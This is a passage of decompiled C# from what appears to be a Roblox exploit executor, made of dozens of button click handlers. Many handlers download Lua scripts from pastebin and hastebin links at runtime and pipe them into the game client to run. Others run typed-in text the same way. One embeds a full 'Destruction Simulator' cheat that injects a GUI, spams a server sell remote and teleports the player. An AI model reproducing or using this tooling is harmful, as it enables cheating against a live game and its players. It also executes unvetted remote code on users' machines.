    private void flatButton151_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/BEZU0bMs"));
    }

    private void flatButton150_Click(object sender, EventArgs e)
    {
    }

    private void flatButton153_Click(object sender, EventArgs e)
    {
    }

    private void flatButton152_Click(object sender, EventArgs e)
    {
    }

    private void flatButton155_Click(object sender, EventArgs e)
    {
    }

    private void flatButton154_Click(object sender, EventArgs e)
    {
    }

    private void flatButton157_Click(object sender, EventArgs e)
    {
    }

    private void flatButton156_Click(object sender, EventArgs e)
    {
    }

    private void flatButton159_Click(object sender, EventArgs e)
    {
    }

    private void flatButton158_Click(object sender, EventArgs e)
    {
    }

    private void flatButton161_Click(object sender, EventArgs e)
    {
    }

    private void flatButton160_Click(object sender, EventArgs e)
    {
    }

    private void flatButton163_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("wait(0.01)\n \ngame.StarterGui:SetCore('ChatMakeSystemMessage', {\n Text = 'Ran, Made by Atom!';\n Color = Color3.new (0, 185, 0);\n Font = Enum.Font.SourceSansBold;\n FontSize = Enum.FontSize.Size24;\n})\nwait(1)\ngame.StarterGui:SetCore('ChatMakeSystemMessage', {\n Text = 'Scripts by JlmmyKewlKiDz!';\n Color = Color3.new (170, 0, 0);\n Font = Enum.Font.SourceSansBold;\n FontSize = Enum.FontSize.Size24;\n})\n\n\n-- Made by Atom\n\n-- Scripts to JlmmyKewlKiDz\n\n\nlocal Name = game.Players.LocalPlayer.Name\n\nlocal DestructionSim = Instance.new ('ScreenGui')\nlocal BG = Instance.new ('Frame')\nlocal BGDETAIL = Instance.new ('Frame')\nlocal DetailLabel = Instance.new ('TextLabel')\nlocal AutoSell = Instance.new ('TextButton')\nlocal Shop = Instance.new ('TextButton')\nlocal AutoFarm = Instance.new ('TextButton')\nlocal Site = Instance.new ('TextButton')\nlocal Home = Instance.new ('TextButton')\nlocal Ship = Instance.new ('TextButton')\nlocal Space = Instance.new ('TextButton')\nlocal Camp = Instance.new ('TextButton')\nlocal Pillar = Instance.new ('TextButton')\nlocal Castle = Instance.new ('TextButton')\nlocal Empire = Instance.new ('TextButton')\nlocal Exit = Instance.new ('TextButton')\nlocal Farm = Instance.new ('TextButton')\n\nDestructionSim.Name = 'DestructionSim'\nDestructionSim.Parent = game.CoreGui\n\nBG.Name = 'BG'\nBG.Parent = DestructionSim\nBG.BackgroundColor3 = Color3.new (0.0980392, 0.0980392, 0.0980392)\nBG.BorderColor3 = Color3.new (0.137255, 0.137255, 0.137255)\nBG.Position = UDim2.new (0.629268289, 0, 0.380478084, 0)\nBG.Size = UDim2.new (0, 270, 0, 257)\nBG.Active = true\nBG.Draggable = true\n\nBGDETAIL.Name = 'BGDETAIL'\nBGDETAIL.Parent = BG\nBGDETAIL.BackgroundColor3 = Color3.new (0.458824, 0.792157, 1)\nBGDETAIL.BorderColor3 = Color3.new (0.352941, 0.643137, 0.807843)\nBGDETAIL.Size = UDim2.new (0, 270, 0, 30)\n\nDetailLabel.Name = 'DetailLabel'\nDetailLabel.Parent = BGDETAIL\nDetailLabel.BackgroundColor3 = Color3.new (1, 1, 1)\nDetailLabel.BackgroundTransparency = 1\nDetailLabel.Position = UDim2.new (0.129629590, 0, 0, 0)\nDetailLabel.Size = UDim2.new (0, 230, 0, 30)\nDetailLabel.Font = Enum.Font.SourceSansBold\nDetailLabel.Text = 'Destruction Simulator'\nDetailLabel.TextColor3 = Color3.new (1, 1, 1)\nDetailLabel.TextScaled = true\nDetailLabel.TextSize = 14\nDetailLabel.TextWrapped = true\n\nAutoSell.Name = 'AutoSell'\nAutoSell.Parent = BG\nAutoSell.BackgroundColor3 = Color3.new (0.137255, 0.137255, 0.137255)\nAutoSell.BorderColor3 = Color3.new (0.176471, 0.176471, 0.176471)\nAutoSell.Position = UDim2.new (0.0333333351, 0, 0.176002949, 0)\nAutoSell.Size = UDim2.new (0, 107, 0, 22)\nAutoSell.Font = Enum.Font.SourceSansBold\nAutoSell.Text = 'Auto Sell'\nAutoSell.TextColor3 = Color3.new (1, 1, 1)\nAutoSell.TextScaled = true\nAutoSell.TextSize = 14\nAutoSell.TextWrapped = true\n\nAutoSell.MouseButton1Click:connect(function()\nlocal remote = game['ReplicatedStorage']['Remotes']['sellBricks']\nwhile true do\n remote:FireServer()\n wait(12.5)\nend\nend)\n\nShop.Name = 'Shop'\nShop.Parent = BG\nShop.BackgroundColor3 = Color3.new (0.137255, 0.137255, 0.137255)\nShop.BorderColor3 = Color3.new (0.176471, 0.176471, 0.176471)\nShop.Position = UDim2.new (0.566666663, 0, 0.176724136, 0)\nShop.Size = UDim2.new (0, 107, 0, 22)\nShop.Font = Enum.Font.SourceSansBold\nShop.Text = 'Teleport to Shop'\nShop.TextColor3 = Color3.new (1, 1, 1)\nShop.TextScaled = true\nShop.TextSize = 14\nShop.TextWrapped = true\n\nShop.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new (- 52.7326279, 3.45200205, -556.515015)\nend)\n\nSite.Name = 'Site'\nSite.Parent = BG\nSite.BackgroundColor3 = Color3.new (0.137255, 0.137255, 0.137255)\nSite.BorderColor3 = Color3.new (0.176471, 0.176471, 0.176471)\nSite.Position = UDim2.new (0.0333333351, 0, 0.301724136, 0)\nSite.Size = UDim2.new (0, 107, 0, 22)\nSite.Font = Enum.Font.SourceSansBold\nSite.Text = '[10] Construction Site'\nSite.TextColor3 = Color3.new (1, 1, 1)\nSite.TextScaled = true\nSite.TextSize = 14\nSite.TextWrapped = true\n\nSite.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new (- 89, 3, -452)\nend)\n\nAutoFarm.Name = 'AutoFarm'\nAutoFarm.Parent = BG\nAutoFarm.BackgroundColor3 = Color3.new (0.137255, 0.137255, 0.137255)\nAutoFarm.BorderColor3 = Color3.new (0.176471, 0.176471, 0.176471)\nAutoFarm.Position = UDim2.new (0.566666663, 0, 0.303501934, 0)\nAutoFarm.Size = UDim2.new (0, 105, 0, 22)\nAutoFarm.Font = Enum.Font.SourceSansBold\nAutoFarm.Text = '[20] Semi Auto Farm'\nAutoFarm.TextColor3 = Color3.new (1, 1, 1)\nAutoFarm.TextScaled = true\nAutoFarm.TextSize = 14\nAutoFarm.TextWrapped = true\n\nAutoFarm.MouseButton1Click:connect(function()\nlocal plr = game.Players.LocalPlayer\nlocal c = plr.Character\nlocal remote = Game['ReplicatedStorage']['Remotes']['sellBricks']\n\nwhile true do\n c = game.Players.LocalPlayer.Character\n c:SetPrimaryPartCFrame(CFrame.new (71, 5, 60))\n remote:FireServer()\n wait(5)\n c:SetPrimaryPartCFrame(CFrame.new (106, 1.5, 140))\n remote:FireServer()\n wait(5)\n c:SetPrimaryPartCFrame(CFrame.new (106, 21, 175))\n remote:FireServer()\n wait(5)\n c:SetPrimaryPartCFrame(CFrame.new (150, 19, 177))\n remote:FireServer()\n wait(5)\n c:SetPrimaryPartCFrame(CFrame.new (145, 7, 122))\n remote:FireServer()\n wait(5)\n c:SetPrimaryPartCFrame(CFrame.new (145, 7, 100))\n remote:FireServer()\n wait(5)\n c:SetPrimaryPartCFrame(CFrame.new (145, 7, 190))\n remote:FireServer()\n wait(5)\n c:SetPrimaryPartCFrame(CFrame.new (100, 7, 210))\n remote:FireServer()\n wait(5)\nend\nend)\n\nHome.Name = 'Home'\nHome.Parent = BG\nHome.BackgroundColor3 = Color3.new (0.137255, 0.137255, 0.137255)\nHome.BorderColor3 = Color3.new (0.176471, 0.176471, 0.176471)\nHome.Position = UDim2.new (0.567841053, 0, 0.421485007, 0)\nHome.Size = UDim2.new (0, 107, 0, 22)\nHome.Font = Enum.Font.SourceSansBold\nHome.Text = '[15] Happy Home In Robloxia'\nHome.TextColor3 = Color3.new (1, 1, 1)\nHome.TextScaled = true\nHome.TextSize = 14\nHome.TextWrapped = true\n\nHome.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new (- 88, 3.5, -150)\nend)\n\nShip.Name = 'Ship'\nShip.Parent = BG\nShip.BackgroundColor3 = Color3.new (0.137255, 0.137255, 0.137255)\nShip.BorderColor3 = Color3.new (0.176471, 0.176471, 0.176471)\nShip.Position = UDim2.new (0.0333333351, 0, 0.536964953, 0)\nShip.Size = UDim2.new (0, 107, 0, 22)\nShip.Font = Enum.Font.SourceSansBold\nShip.Text = '[20] Ship & LightTower'\nShip.TextColor3 = Color3.new(1, 1, 1)\nShip.TextScaled = true\nShip.TextSize = 14\nShip.TextWrapped = true\n\nShip.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(18.19, 3.35, 144)\nend)\n\nSpace.Name = 'Space'\nSpace.Parent = BG\nSpace.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nSpace.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nSpace.Position = UDim2.new(0.567841053, 0, 0.538166225, 0)\nSpace.Size = UDim2.new(0, 107, 0, 22)\nSpace.Font = Enum.Font.SourceSansBold\nSpace.Text = '[25] Space Travel'\nSpace.TextColor3 = Color3.new(1, 1, 1)\nSpace.TextScaled = true\nSpace.TextSize = 14\nSpace.TextWrapped = true\n\nSpace.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(-89.05, 3.35, 144)\nend)\n\nCamp.Name = 'Camp'\nCamp.Parent = BG\nCamp.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nCamp.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nCamp.Position = UDim2.new(0.0345077515, 0, 0.658738494, 0)\nCamp.Size = UDim2.new(0, 107, 0, 22)\nCamp.Font = Enum.Font.SourceSansBold\nCamp.Text = '[30] Military Camp'\nCamp.TextColor3 = Color3.new(1, 1, 1)\nCamp.TextScaled = true\nCamp.TextSize = 14\nCamp.TextWrapped = true\n\nCamp.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(17.74, 3.35, 453.33)\nend)\n\nPillar.Name = 'Pillar'\nPillar.Parent = BG\nPillar.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nPillar.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nPillar.Position = UDim2.new(0.56413734, 0, 0.658738494, 0)\nPillar.Size = UDim2.new(0, 107, 0, 22)\nPillar.Font = Enum.Font.SourceSansBold\nPillar.Text = '[35] Pyramid & Pillars'\nPillar.TextColor3 = Color3.new(1, 1, 1)\nPillar.TextScaled = true\nPillar.TextSize = 14\nPillar.TextWrapped = true\n\nPillar.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(-86.08, 3.35, 446.63)\nend)\n\nCastle.Name = 'Castle'\nCastle.Parent = BG\nCastle.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nCastle.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nCastle.Position = UDim2.new(0.0345076919, 0, 0.798816323, 0)\nCastle.Size = UDim2.new(0, 107, 0, 22)\nCastle.Font = Enum.Font.SourceSansBold\nCastle.Text = '[40] Castle'\nCastle.TextColor3 = Color3.new(1, 1, 1)\nCastle.TextScaled = true\nCastle.TextSize = 14\nCastle.TextWrapped = true\n\nCastle.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(18.35, 3.35, 774.2)\nend)\n\nEmpire.Name = 'Empire'\nEmpire.Parent = BG\nEmpire.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nEmpire.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nEmpire.Position = UDim2.new(0.567841053, 0, 0.798816323, 0)\nEmpire.Size = UDim2.new(0, 107, 0, 22)\nEmpire.Font = Enum.Font.SourceSansBold\nEmpire.Text = '[45] Empire State & HQ'\nEmpire.TextColor3 = Color3.new(1, 1, 1)\nEmpire.TextScaled = true\nEmpire.TextSize = 14\nEmpire.TextWrapped = true\n\nEmpire.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(-89.75, 3.35, 747.22)\nend)\n\nExit.Name = 'Exit'\nExit.Parent = BG\nExit.BackgroundColor3 = Color3.new(0.458824, 0.792157, 1)\nExit.BorderSizePixel = 0\nExit.Size = UDim2.new(0, 35, 0, 30)\nExit.Font = Enum.Font.SourceSansBold\nExit.Text = 'X'\nExit.TextColor3 = Color3.new(1, 1, 1)\nExit.TextScaled = true\nExit.TextSize = 14\nExit.TextWrapped = true\n\nExit.MouseButton1Click:connect(function()\nDestructionSim:Destroy()\nend)\n\n\nFarm.Name = 'Farm'\nFarm.Parent = BG\nFarm.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)\nFarm.BorderColor3 = Color3.new(0.176471, 0.176471, 0.176471)\nFarm.Position = UDim2.new(0.0345077515, 0, 0.421447635, 0)\nFarm.Size = UDim2.new(0, 107, 0, 22)\nFarm.Font = Enum.Font.SourceSansBold\nFarm.Text = '[10] Farm'\nFarm.TextColor3 = Color3.new(1, 1, 1)\nFarm.TextScaled = true\nFarm.TextSize = 14\nFarm.TextWrapped = true\n\nFarm.MouseButton1Click:connect(function()\ngame.Workspace[Name].HumanoidRootPart.CFrame = CFrame.new(16.23, 3.35, -152.98)\nend)");
    }

    private void flatButton162_Click(object sender, EventArgs e)
    {
    }

    private void label1_Click(object sender, EventArgs e)
    {
    }

    private void flatButton149_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage51);
    }

    private void flatButton148_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage52);
    }

    private void flatButton147_Click(object sender, EventArgs e)
    {
    }

    private void flatButton146_Click(object sender, EventArgs e)
    {
    }

    private void flatButton145_Click(object sender, EventArgs e)
    {
    }

    private void flatButton144_Click(object sender, EventArgs e)
    {
    }

    private void flatButton143_Click(object sender, EventArgs e)
    {
    }

    private void flatButton142_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage58);
    }

    private void flatButton164_Click(object sender, EventArgs e)
    {
    }

    private void flatButton165_Click(object sender, EventArgs e)
    {
    }

    private void flatButton172_Click(object sender, EventArgs e)
    {
    }

    private void flatButton173_Click(object sender, EventArgs e)
    {
    }

    private void flatButton32_Click(object sender, EventArgs e)
    {
    }

    private void flatButton66_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/x9She8BF"));
    }

    private void flatButton174_Click(object sender, EventArgs e)
    {
    }

    private void flatButton175_Click(object sender, EventArgs e)
    {
    }

    private void flatButton176_Click(object sender, EventArgs e)
    {
    }

    private void flatButton177_Click(object sender, EventArgs e)
    {
    }

    private void flatButton178_Click(object sender, EventArgs e)
    {
    }

    private void flatButton179_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/BM8NqpMN"));
    }

    private void flatButton180_Click(object sender, EventArgs e)
    {
    }

    private void flatButton181_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/q6WHcj2D"));
    }

    private void flatButton182_Click(object sender, EventArgs e)
    {
    }

    private void flatButton183_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/q817HYb9"));
    }

    private void flatButton184_Click(object sender, EventArgs e)
    {
    }

    private void flatButton185_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/5kx4tsUf"));
    }

    private void flatButton171_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage61);
    }

    private void flatButton170_Click(object sender, EventArgs e)
    {
    }

    private void flatButton169_Click(object sender, EventArgs e)
    {
    }

    private void flatButton168_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage64);
    }

    private void flatButton166_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage65);
    }

    private void flatButton65_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage66);
    }

    private void flatButton30_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage67);
    }

    private void flatButton186_Click(object sender, EventArgs e)
    {
    }

    private void flatButton194_Click(object sender, EventArgs e)
    {
    }

    private void flatButton195_Click(object sender, EventArgs e)
    {
    }

    private void flatButton196_Click(object sender, EventArgs e)
    {
    }

    private void flatButton197_Click(object sender, EventArgs e)
    {
    }

    private void flatButton198_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/CDHuYk9U"));
    }

    private void flatButton199_Click(object sender, EventArgs e)
    {
    }

    private void flatButton200_Click(object sender, EventArgs e)
    {
    }

    private void flatButton201_Click(object sender, EventArgs e)
    {
    }

    private void flatButton202_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/nJCCLXSn"));
    }

    private void flatButton203_Click(object sender, EventArgs e)
    {
    }

    private void flatButton204_Click(object sender, EventArgs e)
    {
    }

    private void flatButton205_Click(object sender, EventArgs e)
    {
    }

    private void flatButton206_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox59.Text);
    }

    private void flatButton207_Click(object sender, EventArgs e)
    {
    }

    private void flatButton193_Click(object sender, EventArgs e)
    {
    }

    private void flatButton192_Click(object sender, EventArgs e)
    {
    }

    private void flatButton191_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage70);
    }

    private void flatButton190_Click(object sender, EventArgs e)
    {
    }

    private void flatButton189_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage72);
    }

    private void flatButton188_Click(object sender, EventArgs e)
    {
    }

    private void flatButton187_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage74);
    }

    private void flatButton209_Click(object sender, EventArgs e)
    {
    }

    private void flatButton210_Click(object sender, EventArgs e)
    {
    }

    private void flatButton208_Click(object sender, EventArgs e)
    {
    }

    private void flatButton167_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage94);
    }

    private void flatButton219_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/GXM8BzXv"));
    }

    private void flatButton218_Click(object sender, EventArgs e)
    {
    }

    private void flatButton220_Click(object sender, EventArgs e)
    {
    }

    private void flatButton221_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/PMrH2V3F"));
    }

    private void flatButton222_Click(object sender, EventArgs e)
    {
    }

    private void flatButton223_Click(object sender, EventArgs e)
    {
    }

    private void flatButton224_Click(object sender, EventArgs e)
    {
    }

    private void flatButton225_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://hastebin.com/raw/ekidiqohew"));
    }

    private void flatButton227_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Qs8Q7jUZ"));
    }

    private void flatButton226_Click(object sender, EventArgs e)
    {
    }

    private void flatButton229_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZNCeSaCd"));
    }

    private void flatButton228_Click(object sender, EventArgs e)
    {
    }

    private void flatButton230_Click(object sender, EventArgs e)
    {
    }

    private void flatButton231_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/tz60v82X"));
    }

    private void flatButton232_Click(object sender, EventArgs e)
    {
    }

    private void flatButton233_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/yigKxDrK"));
    }

    private void flatButton217_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage76);
    }

    private void flatButton216_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage77);
    }

    private void flatButton215_Click(object sender, EventArgs e)
    {
    }

    private void flatButton214_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage79);
    }

    private void flatButton213_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage80);
    }

    private void flatButton212_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage81);
    }

    private void flatButton211_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage82);
    }

    private void flatButton51_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage83);
    }

    private void flatButton60_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/TV0wSq0r"));
    }

    private void tabPage84_Click(object sender, EventArgs e)
    {
    }

    private void flatButton235_Click(object sender, EventArgs e)
    {
    }

    private void flatButton125_Click(object sender, EventArgs e)
    {
    }

    private void flatButton243_Click(object sender, EventArgs e)
    {
    }

    private void flatButton242_Click(object sender, EventArgs e)
    {
    }

    private void flatButton245_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/rT3UCQRs"));
    }

    private void flatButton244_Click(object sender, EventArgs e)
    {
    }

    private void flatButton247_Click(object sender, EventArgs e)
    {
    }

    private void flatButton246_Click(object sender, EventArgs e)
    {
    }

    private void flatButton249_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jwM4QgHr"));
    }

    private void flatButton248_Click(object sender, EventArgs e)
    {
    }

    private void flatButton251_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox67.Text);
    }

    private void flatButton250_Click(object sender, EventArgs e)
    {
    }

    private void flatButton253_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/YjAvvzzS"));
    }

    private void flatButton252_Click(object sender, EventArgs e)
    {
    }

    private void flatButton255_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/U740ZDRy"));
    }

    private void flatButton254_Click(object sender, EventArgs e)
    {
    }

    private void flatButton256_Click(object sender, EventArgs e)
    {
    }

    private void flatButton257_Click(object sender, EventArgs e)
    {
    }

    private void flatButton241_Click(object sender, EventArgs e)
    {
    }

    private void flatButton240_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage86);
    }

    private void flatButton239_Click(object sender, EventArgs e)
    {
    }

    private void flatButton238_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage88);
    }

    private void flatButton237_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage89);
    }

    private void flatButton236_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage90);
    }

    private void flatButton67_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage91);
    }

    private void flatButton33_Click(object sender, EventArgs e)
    {
    }

    private void flatButton258_Click(object sender, EventArgs e)
    {
    }

    private void flatButton259_Click(object sender, EventArgs e)
    {
    }

    private void flatButton31_Click(object sender, EventArgs e)
    {
    }

    private void flatButton68_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/154RJ1mv"));
    }

    private void flatButton266_Click(object sender, EventArgs e)
    {
    }

    private void flatButton267_Click(object sender, EventArgs e)
    {
    }

    private void flatButton268_Click(object sender, EventArgs e)
    {
    }

    private void flatButton269_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox68.Text);
    }

    private void flatButton270_Click(object sender, EventArgs e)
    {
    }

    private void flatButton271_Click(object sender, EventArgs e)
    {
    }

    private void flatButton272_Click(object sender, EventArgs e)
    {
    }

    private void flatButton273_Click(object sender, EventArgs e)
    {
    }

    private void flatButton274_Click(object sender, EventArgs e)
    {
    }

    private void flatButton275_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jqydVbSr"));
    }

    private void flatButton265_Click(object sender, EventArgs e)
    {
    }

    private void flatButton276_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Aw5wTCLa"));
    }

    private void flatButton69_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage32);
    }

    private void flatButton264_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage96);
    }

    private void flatButton262_Click(object sender, EventArgs e)
    {
    }

    private void flatButton261_Click(object sender, EventArgs e)
    {
    }

    private void flatButton260_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage99);
    }

    private void flatButton27_Click(object sender, EventArgs e)
    {
    }

    private void flatButton263_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage64);
    }

    private void flatButton278_Click(object sender, EventArgs e)
    {
    }

    private void flatButton279_Click(object sender, EventArgs e)
    {
    }

    private void flatButton288_Click(object sender, EventArgs e)
    {
    }

    private void flatButton289_Click(object sender, EventArgs e)
    {
    }

    private void flatButton290_Click(object sender, EventArgs e)
    {
    }

    private void flatButton291_Click(object sender, EventArgs e)
    {
    }

    private void flatButton292_Click(object sender, EventArgs e)
    {
    }

    private void flatButton293_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/JPk8XQd6"));
    }

    private void flatButton294_Click(object sender, EventArgs e)
    {
    }

    private void flatButton295_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox75.Text);
    }

    private void flatButton296_Click(object sender, EventArgs e)
    {
    }

    private void flatButton297_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox76.Text);
    }

    private void flatButton298_Click(object sender, EventArgs e)
    {
    }

    private void flatButton299_Click(object sender, EventArgs e)
    {
    }

    private void flatButton300_Click(object sender, EventArgs e)
    {
    }

    private void flatButton301_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZXPd7Mtx"));
    }

    private void flatButton302_Click(object sender, EventArgs e)
    {
    }

    private void flatButton303_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/GZWNs9uv"));
    }

    private void flatButton287_Click(object sender, EventArgs e)
    {
    }

    private void flatButton286_Click(object sender, EventArgs e)
    {
    }

    private void flatButton285_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage103);
    }

    private void flatButton284_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage104);
    }

    private void flatButton283_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage105);
    }

    private void flatButton282_Click(object sender, EventArgs e)
    {
    }

    private void flatButton281_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage107);
    }

    private void flatButton280_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage108);
    }

    private void flatButton304_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/UKZxyFHF"));
    }

    private void method_58(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/UKZxyFHF"));
    }

    private void flatButton306_Click(object sender, EventArgs e)
    {
    }

    private void flatButton307_Click(object sender, EventArgs e)
    {
    }

    private void flatButton277_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/n72RGPNa"));
    }

    private void flatButton314_Click(object sender, EventArgs e)
    {
    }

    private void flatButton315_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/YkNcYx4Q"));
    }

    private void flatButton316_Click(object sender, EventArgs e)
    {
    }

    private void flatButton317_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/QUv5t5H1"));
    }

    private void flatButton318_Click(object sender, EventArgs e)
    {
    }

    private void flatButton319_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/0BEnnwC4"));
      int num = (int) MessageBox.Show("Ps. You have to re execute everytime there is a new giant.");
    }

    private void flatButton320_Click(object sender, EventArgs e)
    {
    }

    private void flatButton321_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.richTextBox6.Text);
    }

    private void flatButton322_Click(object sender, EventArgs e)
    {
    }

    private void flatButton323_Click(object sender, EventArgs e)
    {
    }

    private void flatButton324_Click(object sender, EventArgs e)
    {
    }

    private void flatButton325_Click(object sender, EventArgs e)
    {
    }

    private void flatButton313_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage110);
    }

    private void flatButton312_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage111);
    }

    private void flatButton311_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage112);
    }

    private void flatButton310_Click(object sender, EventArgs e)
    {
      this.flatTabControl2.SelectTab(this.tabPage113);
    }

    private void flatButton309_Click(object sender, EventArgs e)
